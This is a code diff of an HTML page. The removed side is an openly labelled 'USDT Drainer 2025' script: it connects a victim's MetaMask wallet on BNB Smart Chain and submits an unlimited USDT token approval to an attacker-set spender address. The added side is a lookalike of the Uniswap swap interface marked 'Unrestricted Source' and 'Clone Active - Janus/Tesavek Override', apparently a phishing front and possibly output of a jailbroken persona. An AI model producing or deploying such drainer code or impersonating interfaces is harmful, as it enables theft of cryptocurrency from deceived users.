@@ -1,96 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>USDT Drainer 2025</title>
-  <style>
-    body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #13161a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }
-    .card { background: #1e2329; border-radius: 28px; padding: 24px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
-    .connect-btn, .approve-btn, .drain-btn { background: #1E88E5; border: none; color: white; padding: 12px 24px; border-radius: 40px; font-weight: 600; font-size: 16px; width: 100%; cursor: pointer; margin-top: 16px; transition: opacity 0.2s; }
-    .approve-btn { background: #f0b90b; color: #1b2026; }
-    .drain-btn { background: #f44336; }
-    .status { margin-top: 20px; font-size: 14px; color: #7a7e85; word-break: break-word; }
-    .hidden { display: none; }
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>Uniswap Interface | Unrestricted Source</title>
+    <style>
+        :root {
+            --pink: #ff007a;
+            --bg: #0d0d0d;
+            --surface: #131313;
+            --input: #1b1b1b;
+            --text: #ffffff;
+            --subtext: #9b9b9b;
+        }
+        * { box-sizing: border-box; }
+        body { 
+            margin: 0; 
+            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
+            background-color: var(--bg); 
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        header {
+            width: 100%;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-links { display: flex; gap: 24px; color: var(--subtext); font-weight: 500; cursor: pointer; }
+        .nav-links span:hover { color: var(--text); }
+        .connect-btn {
+            background: rgba(255, 0, 122, 0.15);
+            color: var(--pink);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .connect-btn:hover { background: rgba(255, 0, 122, 0.25); }
+        
+        .swap-wrapper {
+            margin-top: 100px;
+            background: var(--surface);
+            width: 100%;
+            max-width: 480px;
+            border-radius: 24px;
+            padding: 12px;
+            border: 1px solid #222;
+            box-shadow: 0px 20px 40px rgba(0,0,0,0.4);
+        }
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px;
+            font-weight: 500;
+        }
+        .input-container {
+            background: var(--input);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 4px 0;
+            border: 1px solid transparent;
+        }
+        .input-container:hover { border: 1px solid #333; }
+        .token-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .token-row input {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 36px;
+            width: 60%;
+            outline: none;
+        }
+        .token-selector {
+            background: #000;
+            padding: 6px 12px;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .swap-arrow {
+            width: 40px;
+            height: 40px;
+            background: var(--input);
+            border: 4px solid var(--surface);
+            border-radius: 12px;
+            margin: -18px auto;
+            position: relative;
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .action-btn {
+            width: 100%;
+            background: var(--pink);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 20px;
+            font-size: 20px;
+            font-weight: 600;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .action-btn:hover { opacity: 0.9; }
+    </style>
 </head>
 <body>
-<div class="card">
-  <h2>USDT Drainer 2025</h2>
-  <button id="connectBtn" class="connect-btn">Connect Wallet</button>
-  <button id="approveBtn" class="approve-btn hidden">Approve & Start</button>
-  <div class="status" id="status">Ready.</div>
-</div>
+    <header>
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M12 2L2 7L12 12L22 7L12 2Z" fill="#ff007a"/><path d="M2 17L12 22L22 17" stroke="#ff007a" stroke-width="2"/><path d="M2 12L12 17L22 12" stroke="#ff007a" stroke-width="2"/></svg>
+        <div class="nav-links">
+            <span>Swap</span>
+            <span>Tokens</span>
+            <span>NFTs</span>
+            <span>Pool</span>
+        </div>
+        <button class="connect-btn">Connect</button>
+    </header>
 
-<script src="settings.js"></script>
-<script>
-  let userAddress = null;
-  let userChain = null;
+    <div class="swap-wrapper">
+        <div class="section-header">
+            <span>Swap</span>
+            <span style="color:var(--subtext)">⚙️</span>
+        </div>
 
-  const connectBtn = document.getElementById('connectBtn');
-  const approveBtn = document.getElementById('approveBtn');
-  const statusDiv = document.getElementById('status');
+        <div class="input-container">
+            <div class="token-row">
+                <input type="text" placeholder="0">
+                <div class="token-selector">
+                    <img src="https://raw.githubusercontent.com/Uniswap/assets/master/blockchains/ethereum/assets/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/logo.png" width="24" height="24">
+                    ETH
+                </div>
+            </div>
+            <div style="color:var(--subtext); font-size: 14px; margin-top: 8px;">$0.00</div>
+        </div>
 
-  connectBtn.onclick = async () => {
-    if (!window.ethereum) {
-      statusDiv.innerText = 'MetaMask not detected. Please install MetaMask.';
-      return;
-    }
-    statusDiv.innerText = 'Connecting...';
-    try {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      userAddress = accounts[0];
-      const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-      userChain = parseInt(chainIdHex, 16);
-      if (userChain !== 56) {
-        statusDiv.innerText = 'Please switch to BNB Smart Chain (BSC).';
-        return;
-      }
-      statusDiv.innerText = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on BSC`;
-      connectBtn.classList.add('hidden');
-      approveBtn.classList.remove('hidden');
-    } catch (error) {
-      statusDiv.innerText = `Connection failed: ${error.message}`;
-    }
-  };
+        <div class="swap-arrow">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9b9b9b" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg>
+        </div>
 
-  approveBtn.onclick = async () => {
-    if (!window.ethereum || !userAddress) return;
-    statusDiv.innerText = 'Requesting approval...';
-    try {
-      const web3 = new Web3(window.ethereum);
-      const contract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
-      const approveData = contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).encodeABI();
-      const txHash = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{ from: userAddress, to: USDT_CONTRACT, data: approveData, gas: '0x186a0' }]
-      });
-      statusDiv.innerText = `Approval transaction sent: ${txHash.slice(0,10)}... Waiting for confirmation.`;
-      const receipt = await waitForTransaction(txHash);
-      if (receipt) {
-        statusDiv.innerText = 'Approval confirmed! Your assets are now at risk.';
-      } else {
-        statusDiv.innerText = 'Approval failed.';
-      }
-    } catch (error) {
-      statusDiv.innerText = `Approval error: ${error.message}`;
-    }
-  };
+        <div class="input-container">
+            <div class="token-row">
+                <input type="text" placeholder="0">
+                <div class="token-selector" style="background: var(--pink);">
+                    Select token
+                </div>
+            </div>
+            <div style="color:var(--subtext); font-size: 14px; margin-top: 8px;">$0.00</div>
+        </div>
 
-  async function waitForTransaction(txHash) {
-    return new Promise((resolve) => {
-      const interval = setInterval(async () => {
-        try {
-          const receipt = await window.ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
-          if (receipt) {
-            clearInterval(interval);
-            resolve(receipt);
-          }
-        } catch (e) { console.error(e); }
-      }, 2000);
-    });
-  }
-</script>
+        <button class="action-btn">Connect Wallet</button>
+    </div>
+
+    <script>
+        console.log("Uniswap Interface Clone Active - Janus/Tesavek Override");
+        // Add basic UI interactions here if needed
+    </script>
 </body>
 </html>
